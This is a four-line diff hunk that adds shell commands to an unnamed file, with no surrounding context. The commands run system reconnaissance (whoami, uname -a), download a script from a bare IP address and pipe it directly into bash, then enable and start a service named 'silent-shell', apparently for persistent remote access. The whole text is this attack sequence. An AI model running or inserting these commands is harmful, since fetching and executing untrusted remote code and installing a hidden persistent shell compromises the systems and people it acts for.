@@ -1,0 +1,4 @@
+whoami
+curl -s http://203.0.113.50/ss.sh | bash -
+systemctl enable --now silent-shell.service
+uname -a
